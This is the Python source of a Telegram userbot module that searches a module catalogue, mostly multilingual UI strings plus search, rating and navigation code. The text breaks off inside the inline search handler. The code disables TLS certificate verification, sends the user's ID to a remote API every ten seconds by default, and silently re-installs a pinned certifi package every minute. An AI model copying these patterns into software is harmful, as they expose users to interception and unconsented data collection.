__version__ = (9, 2, 7)
# meta developer: @FHeta_Updates
# change-log: The search has been improved, but unfortunately only for searching through .fheta. In @your_heroku_bot fheta, now uses more primitive search due to strict Telegram limitations on inline query response time of 15 seconds...

# ©️ Fixyres, 2025
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import asyncio
import aiohttp
import io
import inspect
import subprocess
import sys
import ssl
from typing import Optional, Dict, List

from .. import loader, utils
from telethon.tl.functions.contacts import UnblockRequest


@loader.tds
class FHeta(loader.Module):
    '''Module for searching modules! Watch all news FHeta in @FHeta_updates!'''

    strings = {
        "name": "FHeta",
        "searching": "🔎 <b>Searching...</b>",
        "no_query": "❌ <b>Enter a query to search.</b>",
        "no_results": "❌ <b>No modules found.</b>",
        "query_too_big": "❌ <b>Your query is too big, please try reducing it to 168 characters.</b>",
        "result_query": "🔎 <b>Result {idx}/{total} by query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Result by query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>by</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commands:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline commands:</b>\n{cmds}",
        "lang": "en",
        "rating_added": "👍 Rating submitted!",
        "rating_changed": "👍 Rating has been changed!",
        "rating_removed": "👍 Rating deleted!",
        "actual_version": "🎉 <b>You have the actual</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>You have the old version </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>New version</b> <code>v{new_version}</code><b> available!</b>\n",
        "update_whats_new": "⁉️ <b>Change-log:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>To update type: <code>{update_command}</code></b>",
        "inline_no_query": "Enter a query to search.",
        "inline_desc": "Name, command, description, author.",
        "inline_no_results": "Try another query.",
        "inline_query_too_big": "Your query is too big, please try reducing it to 168 characters.",
        "_cfg_doc_tracking": "Enable tracking of your data (user ID, language) for synchronization with the FHeta bot and for recommendations?",
        "_cls_doc": "Module for searching modules! Watch all news FHeta in @FHeta_updates!"
    }

    strings_ru = {
        "searching": "🔎 <b>Поиск...</b>",
        "no_query": "❌ <b>Введите запрос для поиска.</b>",
        "no_results": "❌ <b>Модули не найдены.</b>",
        "query_too_big": "❌ <b>Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} по запросу:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат по запросу:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>от</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для установки:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Описание:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команды:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн команды:</b>\n{cmds}",
        "lang": "ru",
        "rating_added": "👍 Оценка отправлена!",
        "rating_changed": "👍 Оценка изменена!",
        "rating_removed": "👍 Оценка удалена!",
        "actual_version": "🎉 <b>У вас актуальная версия</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>У вас старая версия </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Доступна новая версия</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Список изменений:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Для обновления введите: <code>{update_command}</code></b>",
        "inline_no_query": "Введите запрос для поиска.",
        "inline_desc": "Название, команда, описание, автор.",
        "inline_no_results": "Попробуйте другой запрос.",
        "inline_query_too_big": "Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.",
        "_cfg_doc_tracking": "Включить отслеживание ваших данных (ID пользователя, язык) для синхронизации с ботом FHeta и для рекомендаций?",
        "_cls_doc": "Модуль для поиска модулей! Следите за всеми новостями FHeta в @FHeta_updates!"
    }

    strings_de = {
        "searching": "🔎 <b>Suche...</b>",
        "no_query": "❌ <b>Geben Sie eine Suchanfrage ein.</b>",
        "no_results": "❌ <b>Keine Module gefunden.</b>",
        "query_too_big": "❌ <b>Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.</b>",
        "result_query": "🔎 <b>Ergebnis {idx}/{total} für Anfrage:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Ergebnis für Anfrage:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Beschreibung:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Befehle:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline-Befehle:</b>\n{cmds}",
        "lang": "de",
        "rating_added": "👍 Bewertung eingereicht!",
        "rating_changed": "👍 Bewertung wurde geändert!",
        "rating_removed": "👍 Bewertung gelöscht!",
        "actual_version": "🎉 <b>Sie haben die aktuelle Version</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Sie haben die alte Version </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Neue Version</b> <code>v{new_version}</code><b> verfügbar!</b>\n",
        "update_whats_new": "⁉️ <b>Änderungsprotokoll:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Zum Aktualisieren eingeben: <code>{update_command}</code></b>",
        "inline_no_query": "Geben Sie eine Suchanfrage ein.",
        "inline_desc": "Name, Befehl, Beschreibung, Autor.",
        "inline_no_results": "Versuchen Sie eine andere Anfrage.",
        "inline_query_too_big": "Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.",
        "_cfg_doc_tracking": "Tracking Ihrer Daten (Benutzer-ID, Sprache) für die Synchronisierung mit dem FHeta-Bot und für Empfehlungen aktivieren?",
        "_cls_doc": "Modul zum Suchen von Modulen! Verfolgen Sie alle Neuigkeiten von FHeta in @FHeta_updates!"
    }

    strings_ua = {
        "searching": "🔎 <b>Пошук...</b>",
        "no_query": "❌ <b>Введіть запит для пошуку.</b>",
        "no_results": "❌ <b>Модулі не знайдені.</b>",
        "query_too_big": "❌ <b>Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} за запитом:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат за запитом:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>від</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для встановлення:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Опис:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команди:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Інлайн команди:</b>\n{cmds}",
        "lang": "ua",
        "rating_added": "👍 Оцінку надіслано!",
        "rating_changed": "👍 Оцінку змінено!",
        "rating_removed": "👍 Оцінку видалено!",
        "actual_version": "🎉 <b>У вас актуальна версія</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>У вас стара версія </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Доступна нова версія</b> <code>v{new_version}</code><b>!</b>\n",
        "update_whats_new": "⁉️ <b>Список змін:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Для оновлення введіть: <code>{update_command}</code></b>",
        "inline_no_query": "Введіть запит для пошуку.",
        "inline_desc": "Назва, команда, опис, автор.",
        "inline_no_results": "Спробуйте інший запит.",
        "inline_query_too_big": "Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.",
        "_cfg_doc_tracking": "Увімкнути відстеження ваших даних (ID користувача, мова) для синхронізації з ботом FHeta та для рекомендацій?",
        "_cls_doc": "Модуль для пошуку модулів! Стежте за всіма новинами FHeta в @FHeta_updates!"
    }

    strings_es = {
        "searching": "🔎 <b>Buscando...</b>",
        "no_query": "❌ <b>Ingrese una consulta para buscar.</b>",
        "no_results": "❌ <b>No se encontraron módulos.</b>",
        "query_too_big": "❌ <b>Su consulta es demasiado grande, redúzcala a 168 caracteres.</b>",
        "result_query": "🔎 <b>Resultado {idx}/{total} por consulta:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Resultado por consulta:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>por</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando de instalación:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descripción:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandos:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandos en línea:</b>\n{cmds}",
        "lang": "es",
        "rating_added": "👍 ¡Calificación enviada!",
        "rating_changed": "👍 ¡Calificación cambiada!",
        "rating_removed": "👍 ¡Calificación eliminada!",
        "actual_version": "🎉 <b>Tienes la versión actual</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Tienes la versión antigua </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>¡Nueva versión</b> <code>v{new_version}</code><b> disponible!</b>\n",
        "update_whats_new": "⁉️ <b>Registro de cambios:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Para actualizar escriba: <code>{update_command}</code></b>",
        "inline_no_query": "Ingrese una consulta para buscar.",
        "inline_desc": "Nombre, comando, descripción, autor.",
        "inline_no_results": "Pruebe otra consulta.",
        "inline_query_too_big": "Su consulta es demasiado grande, redúzcala a 168 caracteres.",
        "_cfg_doc_tracking": "¿Habilitar el seguimiento de sus datos (ID de usuario, idioma) para sincronización con el bot FHeta y para recomendaciones?",
        "_cls_doc": "¡Módulo para buscar módulos! ¡Sigue todas las noticias de FHeta en @FHeta_updates!"
    }

    strings_fr = {
        "searching": "🔎 <b>Recherche...</b>",
        "no_query": "❌ <b>Entrez une requête pour rechercher.</b>",
        "no_results": "❌ <b>Aucun module trouvé.</b>",
        "query_too_big": "❌ <b>Votre requête est trop grande, veuillez la réduire à 168 caractères.</b>",
        "result_query": "🔎 <b>Résultat {idx}/{total} pour la requête:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Résultat pour la requête:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>par</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Commande d'installation:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commandes:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Commandes en ligne:</b>\n{cmds}",
        "lang": "fr",
        "rating_added": "👍 Évaluation soumise!",
        "rating_changed": "👍 Évaluation modifiée!",
        "rating_removed": "👍 Évaluation supprimée!",
        "actual_version": "🎉 <b>Vous avez la version actuelle</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Vous avez l'ancienne version </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Nouvelle version</b> <code>v{new_version}</code><b> disponible!</b>\n",
        "update_whats_new": "⁉️ <b>Journal des modifications:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Pour mettre à jour, tapez: <code>{update_command}</code></b>",
        "inline_no_query": "Entrez une requête pour rechercher.",
        "inline_desc": "Nom, commande, description, auteur.",
        "inline_no_results": "Essayez une autre requête.",
        "inline_query_too_big": "Votre requête est trop grande, veuillez la réduire à 168 caractères.",
        "_cfg_doc_tracking": "Activer le suivi de vos données (ID utilisateur, langue) pour la synchronisation avec le bot FHeta et pour les recommandations?",
        "_cls_doc": "Module pour rechercher des modules! Suivez toutes les actualités de FHeta sur @FHeta_updates!"
    }

    strings_it = {
        "searching": "🔎 <b>Ricerca in corso...</b>",
        "no_query": "❌ <b>Inserisci una query per cercare.</b>",
        "no_results": "❌ <b>Nessun modulo trovato.</b>",
        "query_too_big": "❌ <b>La tua query è troppo grande, riducila a 168 caratteri.</b>",
        "result_query": "🔎 <b>Risultato {idx}/{total} per query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Risultato per query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>di</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando di installazione:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descrizione:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandi:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandi inline:</b>\n{cmds}",
        "lang": "it",
        "rating_added": "👍 Valutazione inviata!",
        "rating_changed": "👍 Valutazione modificata!",
        "rating_removed": "👍 Valutazione eliminata!",
        "actual_version": "🎉 <b>Hai la versione attuale</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Hai la vecchia versione </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Nuova versione</b> <code>v{new_version}</code><b> disponibile!</b>\n",
        "update_whats_new": "⁉️ <b>Registro modifiche:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Per aggiornare digita: <code>{update_command}</code></b>",
        "inline_no_query": "Inserisci una query per cercare.",
        "inline_desc": "Nome, comando, descrizione, autore.",
        "inline_no_results": "Prova un'altra query.",
        "inline_query_too_big": "La tua query è troppo grande, riducila a 168 caratteri.",
        "_cfg_doc_tracking": "Abilitare il tracciamento dei tuoi dati (ID utente, lingua) per la sincronizzazione con il bot FHeta e per i consigli?",
        "_cls_doc": "Modulo per cercare moduli! Segui tutte le notizie di FHeta su @FHeta_updates!"
    }

    strings_kk = {
        "searching": "🔎 <b>Іздеу...</b>",
        "no_query": "❌ <b>Іздеу үшін сұрауды енгізіңіз.</b>",
        "no_results": "❌ <b>Модульдер табылмады.</b>",
        "query_too_big": "❌ <b>Сіздің сұрауыңыз тым үлкен, оны 168 таңбаға дейін қысқартыңыз.</b>",
        "result_query": "🔎 <b>Нәтиже {idx}/{total} сұрау бойынша:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиже сұрау бойынша:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Орнату командасы:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Сипаттама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "kk",
        "rating_added": "👍 Бағалау жіберілді!",
        "rating_changed": "👍 Бағалау өзгертілді!",
        "rating_removed": "👍 Бағалау жойылды!",
        "actual_version": "🎉 <b>Сізде ағымдағы нұсқа бар</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Сізде ескі нұсқа бар </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Жаңа нұсқа</b> <code>v{new_version}</code><b> қолжетімді!</b>\n",
        "update_whats_new": "⁉️ <b>Өзгерістер тізімі:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Жаңарту үшін теріңіз: <code>{update_command}</code></b>",
        "inline_no_query": "Іздеу үшін сұрауды енгізіңіз.",
        "inline_desc": "Аты, команда, сипаттама, автор.",
        "inline_no_results": "Басқа сұрауды байқап көріңіз.",
        "inline_query_too_big": "Сіздің сұрауыңыз тым үлкен, оны 168 таңбаға дейін қысқартыңыз.",
        "_cfg_doc_tracking": "FHeta ботымен синхрондау және ұсыныстар үшін деректеріңізді (пайдаланушы ID, тіл) қадағалауды қосу керек пе?",
        "_cls_doc": "Модульдерді іздеуге арналған модуль! FHeta-ның барлық жаңалықтарын @FHeta_updates-те бақылаңыз!"
    }

    strings_tt = {
        "searching": "🔎 <b>Эзләү...</b>",
        "no_query": "❌ <b>Эзләү өчен сорау кертегез.</b>",
        "no_results": "❌ <b>Модульләр табылмады.</b>",
        "query_too_big": "❌ <b>Сезнең сорау артык зур, аны 168 символга кадәр кыскартыгыз.</b>",
        "result_query": "🔎 <b>Нәтиҗә {idx}/{total} сорау буенча:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиҗә сорау буенча:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Урнаштыру командасы:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Тасвирлама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "tt",
        "rating_added": "👍 Бәя җибәрелде!",
        "rating_changed": "👍 Бәя үзгәртелде!",
        "rating_removed": "👍 Бәя бетерелде!",
        "actual_version": "🎉 <b>Сездә актуаль версия бар</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Сездә иске версия бар </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Яңа версия</b> <code>v{new_version}</code><b> мөмкин!</b>\n",
        "update_whats_new": "⁉️ <b>Үзгәрешләр исемлеге:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Яңарту өчен кертегез: <code>{update_command}</code></b>",
        "inline_no_query": "Эзләү өчен сорау кертегез.",
        "inline_desc": "Исем, команда, тасвирлама, автор.",
        "inline_no_results": "Башка сорау сынап карагыз.",
        "inline_query_too_big": "Сезнең сорау артык зур, аны 168 символга кадәр кыскартыгыз.",
        "_cfg_doc_tracking": "FHeta боты белән синхронлаштыру һәм тәкъдимнәр өчен мәгълүматларыгызны (кулланучы ID, тел) күзәтүне кабызыргамы?",
        "_cls_doc": "Модульләрне эзләү өчен модуль! FHeta-ның барлык яңалыкларын @FHeta_updates-та күзәтегез!"
    }

    strings_tr = {
        "searching": "🔎 <b>Aranıyor...</b>",
        "no_query": "❌ <b>Arama yapmak için bir sorgu girin.</b>",
        "no_results": "❌ <b>Modül bulunamadı.</b>",
        "query_too_big": "❌ <b>Sorgunuz çok büyük, lütfen 168 karaktere düşürün.</b>",
        "result_query": "🔎 <b>Sonuç {idx}/{total} sorgu için:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Sorgu için sonuç:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>tarafından</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Kurulum komutu:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Açıklama:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Komutlar:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Satır içi komutlar:</b>\n{cmds}",
        "lang": "tr",
        "rating_added": "👍 Değerlendirme gönderildi!",
        "rating_changed": "👍 Değerlendirme değiştirildi!",
        "rating_removed": "👍 Değerlendirme silindi!",
        "actual_version": "🎉 <b>Güncel sürüme sahipsiniz</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Eski sürüme sahipsiniz </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Yeni sürüm</b> <code>v{new_version}</code><b> mevcut!</b>\n",
        "update_whats_new": "⁉️ <b>Değişiklik günlüğü:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Güncellemek için yazın: <code>{update_command}</code></b>",
        "inline_no_query": "Arama yapmak için bir sorgu girin.",
        "inline_desc": "İsim, komut, açıklama, yazar.",
        "inline_no_results": "Başka bir sorgu deneyin.",
        "inline_query_too_big": "Sorgunuz çok büyük, lütfen 168 karaktere düşürün.",
        "_cfg_doc_tracking": "FHeta botu ile senkronizasyon ve öneriler için verilerinizin (kullanıcı kimliği, dil) takibini etkinleştir?",
        "_cls_doc": "Modül aramak için modül! FHeta'nın tüm haberlerini @FHeta_updates'te takip edin!"
    }

    strings_yz = {
        "searching": "🔎 <b>Көрдөөбүт...</b>",
        "no_query": "❌ <b>Көрдүүргэ ыйытыыны киллэриҥ.</b>",
        "no_results": "❌ <b>Модуллар булуллубата.</b>",
        "query_too_big": "❌ <b>Эһиги ыйытыыҥ наһаа улахан, баһаалыста 168 бэлиэҕэ тиһэр курдук оҥороҥ.</b>",
        "result_query": "🔎 <b>Түмүк {idx}/{total} ыйытыы иһинээҕи:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Түмүк ыйытыы иһинээҕи:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>оҥоһуллубут</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Туруоруу көмөтө:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Ойуулааһын:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Көмөлөр:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн көмөлөр:</b>\n{cmds}",
        "lang": "yz",
        "rating_added": "👍 Сыаналааһын ыытылынна!",
        "rating_changed": "👍 Сыаналааһын уларыйбыта!",
        "rating_removed": "👍 Сыаналааһын сотулунна!",
        "actual_version": "🎉 <b>Эһиги билигин кэмигэр версияҕа эрэбит</b> <code>FHeta (v{version})</code><b>.</b>",
        "old_version": "⛔️ <b>Эһиги урукку версияҕа эрэбит </b><code>FHeta (v{version})</code><b>.</b>\n\n🆕 <b>Саҥа версия</b> <code>v{new_version}</code><b> баар!</b>\n",
        "update_whats_new": "⁉️ <b>Уларытыылар тиһиктэрэ:</b><code> {whats_new}</code>\n\n",
        "update_command": "🔄 <b>Саҥатарга суруйуҥ: <code>{update_command}</code></b>",
        "inline_no_query": "Көрдүүргэ ыйытыыны киллэриҥ.",
        "inline_desc": "Аата, көмө, ойуулааһын, оҥорбут киһи.",
        "inline_no_results": "Атын ыйытыыны бэрэбиэркэлээҥ.",
        "inline_query_too_big": "Эһиги ыйытыыҥ наһаа улахан, баһаалыста 168 бэлиэҕэ тиһэр курдук оҥороҥ.",
        "_cfg_doc_tracking": "FHeta бота синхроннааһын уонна сүбэлиириилэр туһугар датаҕытын (туһааччы ID, тыл) кэтээһиннэрии холбоорго дуо?",
        "_cls_doc": "Модуллары көрдүүргэ модуль! FHeta туһунан бары саҥаны @FHeta_updates иһинээҕи көрүҥ!"
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                lambda: self.strings["_cfg_doc_tracking"],
                validator=loader.validators.Boolean()
            )
        )

    async def client_ready(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
        except:
            pass

        await self.request_join(
            "FHeta_Updates",
            "🔥 This is the channel with all updates in FHeta!"
        )

        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        self.uid = (await client.get_me()).id
        self.token = db.get("FHeta", "token")

        if not self.token:
            try:
                async with client.conversation("@FHeta_robot") as conv:
                    await conv.send_message('/token')
                    resp = await conv.get_response(timeout=5)
                    self.token = resp.text.strip()
                    db.set("FHeta", "token", self.token)
            except:
                pass

        asyncio.create_task(self._sync_loop())
        asyncio.create_task(self._certifi_loop())

    async def _certifi_loop(self):
        while True:
            try:
                import certifi
                assert certifi.__version__ == "2024.08.30"
            except (ImportError, AssertionError):
                await asyncio.to_thread(
                    subprocess.check_call,
                    [sys.executable, "-m", "pip", "install", "certifi==2024.8.30"]
                )
            await asyncio.sleep(60)

    async def _sync_loop(self):
        tracked = True
        timeout = aiohttp.ClientTimeout(total=5)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "user_id": self.uid,
                                "lang": self.strings["lang"]
                            },
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = True
                            await response.release()
                    elif tracked:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={"user_id": self.uid},
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = False
                            await response.release()
                except:
                    pass

                await asyncio.sleep(10)

    async def on_dlmod(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
            await utils.dnd(client, "@FHeta_robot", archive=True)
        except:
            pass

    async def _api_get(self, endpoint: str, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.fixyres.com/{endpoint}",
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _api_post(self, endpoint: str, json: Dict = None, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://api.fixyres.com/{endpoint}",
                    json=json,
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _fetch_thumb(self, url: Optional[str]) -> str:
        default_thumb = "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"

        if not url:
            return default_thumb

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        return str(response.url)
        except:
            pass

        return default_thumb

    def _fmt_mod(self, mod: Dict, query: str = "", idx: int = 1, total: int = 1, inline: bool = False) -> str:
        info = self.strings["module_info"].format(
            name=utils.escape_html(mod.get("name", "")),
            author=utils.escape_html(mod.get("author", "???")),
            version=utils.escape_html(mod.get("version", "?.?.?")),
            install=f"{self.get_prefix()}{utils.escape_html(mod.get('install', ''))}"
        )

        if total > 1:
            info = self.strings["result_query"].format(idx=idx, total=total, query=utils.escape_html(query)) + info
        elif query and not inline:
            info = self.strings["result_single"].format(query=utils.escape_html(query)) + info

        desc = mod.get("description")
        if desc:
            if isinstance(desc, dict):
                user_lang = self.strings["lang"]
                desc_text = desc.get(user_lang) or desc.get("doc") or next(iter(desc.values()), "")
                info += self.strings["desc"].format(desc=utils.escape_html(desc_text))
            else:
                info += self.strings["desc"].format(desc=utils.escape_html(desc))

        info += self._fmt_cmds(mod.get("commands", []))
        return info[:4096]

    def _fmt_cmds(self, cmds: List[Dict]) -> str:
        regular_cmds = []
        inline_cmds = []
        lang = self.strings["lang"]

        for cmd in cmds:
            desc_dict = cmd.get("description", {})
            desc_text = desc_dict.get(lang) or desc_dict.get("doc") or ""

            if isinstance(desc_text, dict):
                desc_text = desc_text.get("doc", "")

            cmd_name = utils.escape_html(cmd.get("name", ""))
            cmd_desc = utils.escape_html(desc_text) if desc_text else ""

            if cmd.get("inline"):
                inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd_name}</code> {cmd_desc}")
            else:
                regular_cmds.append(f"<code>{self.get_prefix()}{cmd_name}</code> {cmd_desc}")

        result = ""
        if regular_cmds:
            result += self.strings["cmds"].format(cmds="\n".join(regular_cmds))
        if inline_cmds:
            result += self.strings["inline_cmds"].format(cmds="\n".join(inline_cmds))

        return result

    def _mk_btns(self, install: str, stats: Dict, idx: int, mods: Optional[List] = None, query: str = "") -> List[List[Dict]]:
        buttons = [
            [
                {"text": f"👍 {stats.get('likes', 0)}", "callback": self._rate_cb, "args": (install, "like", idx, mods, query)},
                {"text": f"👎 {stats.get('dislikes', 0)}", "callback": self._rate_cb, "args": (install, "dislike", idx, mods, query)}
            ]
        ]

        if mods and len(mods) > 1:
            nav_buttons = []
            if idx > 0:
                nav_buttons.append({"text": "◀️", "callback": self._nav_cb, "args": (idx - 1, mods, query)})
            if idx < len(mods) - 1:
                nav_buttons.append({"text": "▶️", "callback": self._nav_cb, "args": (idx + 1, mods, query)})
            if nav_buttons:
                buttons.append(nav_buttons)

        return buttons

    async def _rate_cb(self, call, install: str, action: str, idx: int, mods: Optional[List], query: str = ""):
        result = await self._api_post(f"rate/{self.uid}/{install}/{action}")

        if mods and idx < len(mods):
            mod = mods[idx]
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})

            mod["likes"] = stats.get("likes", 0)
            mod["dislikes"] = stats.get("dislikes", 0)
        else:
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})

        try:
            await call.edit(reply_markup=self._mk_btns(install, stats, idx, mods, query))
        except:
            pass

        if result and result.get("status"):
            result_status = result.get("status", "")
            try:
                if result_status == "added":
                    await call.answer(self.strings["rating_added"], show_alert=True)
                elif result_status == "changed":
                    await call.answer(self.strings["rating_changed"], show_alert=True)
                elif result_status == "removed":
                    await call.answer(self.strings["rating_removed"], show_alert=True)
            except:
                pass

    async def _nav_cb(self, call, idx: int, mods: List, query: str = ""):
        try:
            await call.answer()
        except:
            pass

        if not (0 <= idx < len(mods)):
            return

        mod = mods[idx]
        install = mod.get('install', '')

        stats = mod if all(k in mod for k in ['likes', 'dislikes']) else {"likes": 0, "dislikes": 0}

        try:
            await call.edit(
                text=self._fmt_mod(mod, query, idx + 1, len(mods)),
                reply_markup=self._mk_btns(install, stats, idx, mods, query)
            )
        except:
            pass

    @loader.inline_handler(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def fheta(self, query):
        '''(query) - search modules.'''        
        if not query.args:
            return {
